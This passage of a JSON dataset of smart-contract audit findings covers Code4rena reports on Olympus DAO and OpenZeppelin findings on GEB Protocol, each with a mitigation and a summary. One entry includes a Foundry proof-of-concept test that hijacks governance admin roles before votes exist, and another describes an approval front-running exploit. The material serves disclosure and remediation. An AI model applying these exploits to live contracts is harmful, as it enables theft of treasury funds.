      "summary": "\nThis bug report is about a vulnerability in the code that could lead to loss of treasury funds. The bug is triggered when the price of the asset is outside the range (high volatility for volatile asset, black swan for stable) for longer than config_.regenWait and config_regenThreshold satisfies the equation config_.regenThreshold <= _config.regenObserve - config_.regenWait / frequency. This would cause the wall price to be far from the true price of the asset leading to loss of treasury funds as it buys/sells at prices well above/below market price. \n\nTo mitigate the risk, a check should be added to verify that the price is within the wall price before regenerating. Alternatively, config_.regenTheshold could be set to satisfy the equation config_.regenThreshold > _config.regenObserve - config_.regenWait / frequency. This would eliminate the risk as _status.high.count >= config_.regenThreshold could never be true for a sustained period where the current price is greater than the wall price.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/118",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3206",
      "title": "[M-02] Solmate `safetransfer` and `safetransferfrom` does not check the codesize of the token address, which may lead to fund loss",
      "impact": "MEDIUM",
      "content": "_Submitted by djxploit, also found by brgltd_\n\nIn `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.<br>\nHence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.<br>\nSo this will lead to miscalculation and possibly loss of funds\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99>\n\n### Recommended Mitigation Steps\n\nUse openzeppelin's safeERC20 or implement a code existence check.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/117#issuecomment-1240019949):**\n > Confirmed. Will implement this. Thank you.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the project 2022-08-olympus. The vulnerability is in the getloan() and replayloan() functions of the TRSRY.sol file, located at lines 110 and 99 respectively. The issue is that the safetransfer and safetransferfrom functions do not check the existence of code at the token address. This could lead to miscalculation of funds and possibly loss of funds, as the protocol will think that funds have been transferred and successful, when in reality they have not. The proof of concept is the code at the two lines mentioned above. The vulnerability was found through manual code review. The recommended mitigation step is to use openzeppelin's safeERC20 or to implement a code existence check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/117",
      "tags": [],
      "finders": [
        "brgltd",
        "djxploit"
      ]
    },
    {
      "id": "3205",
      "title": "[M-01] `Operator::setReserveFactor` doesn't check if bond market should be changed",
      "impact": "MEDIUM",
      "content": "_Submitted by rvierdiiev_\n\n`Operator::setReserveFactor` sets new `reserveFactor` value. This parameter is used in `fullCapacity` function to calculate how much capacity is available by high/low side. Then calculated capacity is used by `Range` module inside `regenerate` function to set the threshold of capacity for both sides of market. Then in `Range::updateCapacity` function this threshold is checked to understand if the wall should be down and the bond market should be closed.\n\nChanging this value means that the capacity of sides has changed and the sides should be regenarated to include this changes.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L711><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L133><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L145><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L185><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L780><br>\n\n### Recommended Mitigation Steps\n\nCall this after the param updating.<br>\n`_regenerate(true); _regenerate(false;`\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1241054503):**\n > Forcing a regeneration when the reserveFactor is updated could cause unintended regeneration if a wall is currently down. A better approach may be to conditionally regenerate each side if they are active.\n\n**[Oighty (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1244128646):**\n > After discussing with the team more, we are going to leave this as-is. It is more flexible to not regenerate the side in this function. With the current implementation, the guardian can determine if the change should go into effect on the next regen, or if it should happen immediately. To enable immediately, they can manually call `regenerate`.\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the code of the 2022-08-olympus project on Github. This bug affects the capacity of the market and can cause the bond market to close. The bug is located in the Operator.sol and RANGE.sol files, and the lines of code are listed in the report. \n\nThe impact of the bug is that when the `reserveFactor` value is changed, the sides of the market should be regenerated to include the changes. To fix this bug, the code should call the `_regenerate` function after the parameter has been updated. \n\nThis bug should be addressed as soon as possible to prevent any issues with the market capacity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/83",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3204",
      "title": "[H-03] TRSRY: front-runnable `setApprovalFor`",
      "impact": "HIGH",
      "content": "_Submitted by zzzitron, also found by berndartmueller, csanuragjain, pashov, Ruhum, sorrynotsorry, and Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48>\n\nAn attacker may be able to withdraw more than intended\n\n### Proof of Concept\n\nLet's say Alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.\n\n```solidity\n// modules/TRSRY.sol\n\n 63     /// @notice Sets approval for specific withdrawer addresses\n 64     function setApprovalFor(\n 65         address withdrawer_,\n 66         ERC20 token_,\n 67         uint256 amount_\n 68     ) external permissioned {\n 69         withdrawApproval[withdrawer_][token_] = amount_;\n 70\n 71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);\n 72     }\n```\n\nThe `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval.\n\n```solidity\n 41\n 42     function grantApproval(\n 43         address for_,\n 44         ERC20 token_,\n 45         uint256 amount_\n 46     ) external onlyRole(\"custodian\") {\n 47         TRSRY.setApprovalFor(for_, token_, amount_);\n 48     }\n```\n\n### Recommended Mitigation Steps\n\nInstead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1238901986):**\n > Understood. Will change the logic to increase/decrease allowances.\n\n**[0xean (judge) increased severity to High and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1249816020):**\n > I think this vulnerability should be a high severity as it opens up the possibility of a direct loss of funds in the amount of up to the previous approval amount. Upgrading to High. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1250385243):**\n > @ind-igo - Not sure if you deleted your comment, but that context is useful.  Happy to take another look here. \n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1251369022):**\n > I did, I just thought it was unnecessary to evaluate the issue. I was just saying that the context of the code is that it is not intended to be used to approve an EOA/multisig, but instead used to approve governance-voted contracts to access treasury funds, in order to deposit into yield contracts or whatever. But I don't think it's very relevant to this, as the code is still faulty and exploitable in an extreme case. I already have made this remediation as well, so all good.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about an issue found in two lines of code in two different files. The issue is that an attacker may be able to withdraw more than the intended amount from the treasury due to a vulnerability in the code. The proof of concept for this vulnerability is that if the treasury custodian reduces the approval to a certain amount, the attacker could frontrun the `setApprovalFor` of that amount and withdraw more than the intended amount. No tools were used in the report. The recommended mitigation steps are that instead of setting the given amount, one should reduce from the current approval in order to check whether the previous approval is spend.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/410",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Trust",
        "pashov",
        "sorrynotsorry",
        "Ruhum",
        "berndartmueller",
        "zzzitron"
      ]
    },
    {
      "id": "3203",
      "title": "[H-02] Anyone can pass any proposal alone before first `VOTES` are minted",
      "impact": "HIGH",
      "content": "_Submitted by Bahurum, also found by bin2chen and cryptphi_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-L218><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268>\n\nBefore any `VOTES` are minted anyone can activate and execute an arbitrary proposal even with 0 votes cast. So an attacker can pass any proposal (i.e. change the `executor` + `admin` of the `Kernel`, gaining access to all permissioned functions and to funds held).\n\n### Proof of Concept\n\nChecks on vote numbers made in `Governance.sol` at lines [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164), [217-218](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-218), [268](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268) pass if `VOTES.totalSupply() == 0`. So, until no `VOTES` are minted, anyone can submit, activate and execute a proposal. There is no need to own or cast votes. This happens if `OlympusGovernance` is granted the `executor` role before any `VOTES` are minted (as in [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol)). The attacker can anticipate/frontrun the minting and pass a proposal to change both the `Kernel` `admin` and `executor`. Then he/she can upgrade malicious modules, steal funds from treasury...\n\nA PoC was obtained modifying the `setUp()` of [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol) by keeping only what is before the minting of `VOTES` (up to [L83](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol#L83) included). The test is as follows:\n\n```solidity\n    function test_AttackerPassesProposalBeforeMinting() public {\n\n        address[] memory users = userCreator.create(1);\n        address attacker = users[0];\n        vm.prank(attacker);\n        MockMalicious attackerControlledContract = new MockMalicious();\n\n        Instruction[] memory instructions_ = new Instruction[](2);\n        instructions_[0] = Instruction(Actions.ChangeAdmin, address(attackerControlledContract));\n        instructions_[1] = Instruction(Actions.ChangeExecutor, address(attackerControlledContract));\n\n        vm.prank(attacker);\n        governance.submitProposal(instructions_, \"proposalName\", \"This is the proposal URI\");\n        \n        governance.endorseProposal(1);\n        \n        vm.prank(attacker);\n        governance.activateProposal(1);\n        \n        vm.warp(block.timestamp + 3 days + 1);\n        \n        governance.executeProposal();\n\n        assert(kernel.executor()==address(attackerControlledContract));\n        assert(kernel.admin()==address(attackerControlledContract));\n\n\n    }\n```\n\nwith\n\n```solidity\ncontract MockMalicious {}\n\n```\n\n### Recommended Mitigation Steps\n\nIn `Governance.sol` check for a minimum VOTES totalSupply, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at line [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164).\n\n**[fullyallocated (Olympus) acknowledged](https://github.com/code-423n4/2022-08-olympus-findings/issues/392)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/392#issuecomment-1249926401):**\n > Leaving as High severity as this shows a clear path to loss of funds.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of the Governance.sol file of the 2022-08-olympus repository on Github. This vulnerability allows anyone to activate and execute a proposal with 0 votes cast, which means an attacker can pass any proposal (i.e. change the 'executor' + 'admin' of the 'Kernel', gaining access to all permissioned functions and to funds held).\n\nThe checks on vote numbers made in Governance.sol at lines L164, 217-218, and 268 pass if VOTES.totalSupply() == 0. This means that until no VOTES are minted, anyone can submit, activate and execute a proposal. A proof of concept was obtained by modifying the setUp() of Governance.t.sol and keeping only what is before the minting of VOTES.\n\nThe recommended mitigation step for this vulnerability is to check for a minimum VOTES totalSupply in Governance.sol, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at line L164.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/392",
      "tags": [],
      "finders": [
        "bin2chen  cryptphi",
        "Bahurum"
      ]
    },
    {
      "id": "3202",
      "title": "[H-01] In `Governance.sol`, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.",
      "impact": "HIGH",
      "content": "_Submitted by hansfriese, also found by berndartmueller, csanuragjain, m9800, V&#95;B, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304>\n\nCurrently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.\n\nAnd the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.\n\nBut `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.\n\n### Proof of Concept\n\nThe below scenario would be possible.\n\n1.  `Proposal 1` was submitted and activated successfully.\n2.  Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%`\n3.  This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`.\n4.  Currently the contract contains more than 81% of total votes and users have at most 19% in total.\n5.  Also users can't reclaim their votes among 81% while `Proposal 1` is active.\n6.  So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221).\n7.  So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nI think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.\n\nI am not sure we can use the current `GRACE_PERIOD` for that purpose.\n\nSo `reclaimVotes()` should be modified like below.\n\n    function reclaimVotes(uint256 proposalId_) external {\n        uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];\n\n        if (userVotes == 0) {\n            revert CannotReclaimZeroVotes();\n        }\n\n        if (proposalId_ == activeProposal.proposalId) {\n            if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++\n            {\n                revert CannotReclaimTokensForActiveVote();\n            }\n        }\n\n        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {\n            revert VotingTokensAlreadyReclaimed();\n        }\n\n        tokenClaimsForProposal[proposalId_][msg.sender] = true;\n\n        VOTES.transferFrom(address(this), msg.sender, userVotes);\n    }\n\n**[fullyallocated (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/376)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the 'Governance.sol' file of the 2022-08-olympus project. This vulnerability affects the ability of users to vote for proposals. Currently, if users vote for the active proposal, the 'VOTES' are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active. This means that the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after the 'GRACE_PERIOD'. However, 'activateProposal()' requires at least 20% endorsements, so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.\n\nTo demonstrate this vulnerability, the bug report provides a proof of concept scenario. In this scenario, a proposal is submitted and activated successfully, but it doesn't meet the execution requirements. This means that the proposal can't be executed, but it can't be replaced either since it involves more than 80% of total votes. This means that the proposal will remain active forever, and no other proposal can be activated.\n\nThe bug report suggests a mitigation step to address this vulnerability. This involves adding a new constant called 'EXECUTION_EXPIRE' so that voters can reclaim their votes after a certain period, even if the proposal is active. This would allow users to reclaim their votes and submit new proposals. The 'reclaimVotes()' function should be modified to incorporate this new constant.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/376",
      "tags": [],
      "finders": [
        "csanuragjain",
        "berndartmueller",
        "zzzitron",
        "m9800",
        "hansfriese",
        "V_B"
      ]
    },
    {
      "id": "11219",
      "title": "[L12] Unnecessary require statements",
      "impact": "LOW",
      "content": "There are several instances in the code base where the `require` statements or conditional checks are unnecessary. For instance:\n\n\n* In the `OracleRelayer` contract, the `require` statement in the `modifyParameters` function at [line 189](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/OracleRelayer.sol#L189) checks if the input parameter `data &gt; 0`. This is unnecessary since the same condition is already checked in the `require` statement at [line 187](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/OracleRelayer.sol#L187).\n* In the `StabilityFeeTreasury` contract, the `require` statement in the `constructor` at [line 113](https://github.com/reflexer-labs/geb/blob/072f00ebd61a6704d7de66fea688479ed97628c3/src/StabilityFeeTreasury.sol#L113) checks if the input address `accountingEngine_` is not the same as `address(this)`. The scenario can happen only when the address of the `StabilityFeeTreasury` contract, that is going to be deployed, is precalculated and then passed to the constructor as the `accountingEngine_` address. Since the `StabilityFeeTreasury` contract is deployed by the governance, which is assumed to not be malicious, this check is unnecessary.\n\n\nTo simplify the code and prevent wastage of gas, consider removing the unnecessary checks.\n\n\n***Update:** Fixed in [pull request #85](https://github.com/reflexer-labs/geb/pull/85/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11218",
      "title": "[L11] Uncommented assembly block",
      "impact": "LOW",
      "content": "The `OracleRelayer` contract includes an [assembly block](https://github.com/reflexer-labs/geb/blob/master/src/OracleRelayer.sol#L135-L157) in the `rpower()` function. The same assembly block is repeated in the [`TaxCollector`](https://github.com/reflexer-labs/geb/blob/master/src/TaxCollector.sol#L148-L170) and [`CoinSavingsAccount`](https://github.com/reflexer-labs/geb/blob/master/src/CoinSavingsAccount.sol#L107-L129) contracts.\n\n\nOther functions like `either()` or `both()` in the [`CollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/master/src/CollateralAuctionHouse.sol#L496-L501), [`LiquidationEngine`](https://github.com/reflexer-labs/geb/blob/master/src/LiquidationEngine.sol#L204-L206), [`SAFEEngine`](https://github.com/reflexer-labs/geb/blob/master/src/SAFEEngine.sol#L320-L325), [`StabilityFeeTreasury`](https://github.com/reflexer-labs/geb/blob/master/src/StabilityFeeTreasury.sol#L207_L212) and [`TaxCollector`](https://github.com/reflexer-labs/geb/blob/master/src/TaxCollector.sol#L210-L215) contracts are using assembly lines without any docstring or comment.\n\n\nWhile this does not pose a security risk *per se*, it is at the same time a complicated and critical part of the system. Moreover, as this is a low-level language that is harder to parse by readers, consider including extensive documentation regarding the rationale behind its use, clearly explaining what every single assembly instruction does. This will make it easier for users to trust the code, for reviewers to verify it, and for developers to build on top of it or update it.\n\n\nNote that the use of assembly discards several important safety features of Solidity, which may render the code unsafer and more error-prone. Hence, consider implementing thorough tests to cover all potential use cases of these functions to ensure they behave as expected.\n\n\n***Update:** Acknowledged, not fixed. Reflexer Labs’ statement for this issue:*\n\n\n\n> \n>  We will have to delay this.\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11217",
      "title": "[L10] Repeated code",
      "impact": "LOW",
      "content": "Throughout the code base, there is consistent use of repeated code. Some instances of repeated code are as follows:\n\n\n* All the arithmetic functions, such as in [`AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L155-L163) or in [`OracleRelayer`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/OracleRelayer.sol#L121-L157), are repeated in many contracts. Note that these arithmetic functions are well covered by [OpenZeppelin Math libraries](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/release-v3.1.0/contracts/math), which are battle tested and widely adopted contracts.\n* The governance functions [`addAuthorization` and `removeAuthorization`, and the modifier `isAuthorized`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/LiquidationEngine.sol#L61-L79) are repetitive.\n* Similarly, the [`either`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L496) and [`both`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L499) functions, which are just performing logical `OR` and `AND` operations, are often repeated in the code base.\n* Lines [199-201](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/StabilityFeeTreasury.sol#L199-L201) of the `disableContract` function in the `StabilityFeeTreasury` contract are the same as the [`joinAllCoins`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/StabilityFeeTreasury.sol#L216) function.\n* The conditions on lines [317-320](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/LiquidationEngine.sol#L317-L320) and [line 348](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/LiquidationEngine.sol#L348) of the `LiquidationEngine` contract are identical.\n* Lines [489-491](https://github.com/reflexer-labs/geb/blob/master/src/SAFEEngine.sol#L489-L491) and [353-355](https://github.com/reflexer-labs/geb/blob/master/src/SAFEEngine.sol#L353-L355) of the `SAFEEngine` contract are repeated.\n* Lines [717](https://github.com/reflexer-labs/geb/blob/master/src/CollateralAuctionHouse.sol#L717) and [726](https://github.com/reflexer-labs/geb/blob/master/src/CollateralAuctionHouse.sol#L726) of the `FixedDiscountCollateralAuctionHouse` contract are repeated.\n* [`getApproximateCollateralBought`](https://github.com/reflexer-labs/geb/blob/master/src/CollateralAuctionHouse.sol#L708) and [`getCollateralBought`](https://github.com/reflexer-labs/geb/blob/master/src/CollateralAuctionHouse.sol#L750)  \n\nfunctions of the `FixedDiscountCollateralAuctionHouse` contract are almost identical.\n\n\nSolidity language provides the use of libraries to call functions that need to be accessed by several contracts and that are always the same. Having libraries is easy for code maintenance since any bug or new functionality can be coded in only one single contract that serves all the others. Also, libraries can also help in reducing the gas cost associated with deployment and use of the contracts while reducing the potential attack surface. Contracts can also define internal functions that are then called internally in many places.\n\n\nConsider adopting libraries and internal functions design to improve code size, quality and readability at the same time.\n\n\n***Update:** Partially fixed in [pull request #84](https://github.com/reflexer-labs/geb/pull/84/files). Lines [199-201 in `StabilityFeeTreasury`](https://github.com/reflexer-labs/geb/pull/84/files#diff-e601d3dfb2a01df7d2653dbdc4614c85871f9ef0e44cab28d9872a862c226dd7L199-R199) have been replaced with a call to `joinAllCoins`, and the [`getAdjustedBid` function](https://github.com/reflexer-labs/geb/pull/84/files#diff-80c57ef7b55d3f669cd4d6f09cd61023b6fad55d93312c251a09bc236a52b5faR667-R692) has been created to consolidate functionality for `getApproximateCollateralBought` and `getCollateralBought`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11216",
      "title": "[L09] Lack of input sanitization",
      "impact": "LOW",
      "content": "Throughout the codebase, many contracts have an instance of the function `modifyParameters()`, which allows authorized accounts to change parameters of the protocol. For example, such functions exist [in the `CoinSavingsAccount`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CoinSavingsAccount.sol#L153) contract and [in the `GlobalSettlement`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L235) contract, among many others.\n\n\nHowever, there are no safety checks for many of these parameters when they are being changed. For example, in the [`GlobalSettlement`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L237-L242) contract, no changes to `address` parameters check that the `address` given is not `address(0)`, or that there is a contract at that address. In the [`AccountingEngine`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/AccountingEngine.sol#L172-L173) contract, some “delay” parameters are not bounded, allowing them to be set to excessively high values. And in the [`CollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L162-L163) contract, some parameters are immediately cast to `uint48`, allowing undetected overflows if the value is higher than `2**48-1`.\n\n\nFurthermore, values passed into `constructor`s for various contracts do not contain input checks. For example, the [`constructor` for the `BasicCollateralJoin` contract](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/BasicTokenAdapters.sol#L97-L105) contains no checks that the two `address` parameters are not `address(0)`, and neither does the [`constructor` of the `CollateralAuctionHouse`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CollateralAuctionHouse.sol#L130-L136) contract.\n\n\nNote that while these are examples, this is not an exhaustive list of all places needing input sanitization. To help follow the “fail early and loudly principle”, ensure that for all instances of `modifyParameters` and for all `constructor`s, there are checks on the values being set. In general, consider checking that `address` parameters are not `address(0)`, that `address`es which correspond to contracts have `extcodesize != 0`, that `uint` variables which are then downcast have not overflowed, and that numeric parameters are bounded to reasonable values given their application.\n\n\n***Update:** Aknowledged, not fixed. Reflexer Labs’ statement for this issue:*\n\n\n\n> \n>  We understand the concern although we’d like to stick to what we inherited from MCD.\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "GEB Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/geb-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11215",
      "title": "[L08] Missing docstrings",
      "impact": "LOW",
      "content": "Many of the contracts and functions in the Reflexer code base lack documentation. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned and the events emitted.\n\n\nFunctions which lack docstrings include:\n\n\n* [`CoinSavingsAccount.rpower`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/CoinSavingsAccount.sol#L107).\n* [`GlobalSettlement.calculateCashPrice`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L351).\n* [`GlobalSettlement.fastTrackAuction`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L281).\n* [`GlobalSettlement.freeCollateral`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L328).\n* [`GlobalSettlement.freezeCollateralType`](https://github.com/reflexer-labs/geb/blob/261407b6b332c2063e4256aa5f9b223d52dad7e1/src/GlobalSettlement.sol#L272).\n* 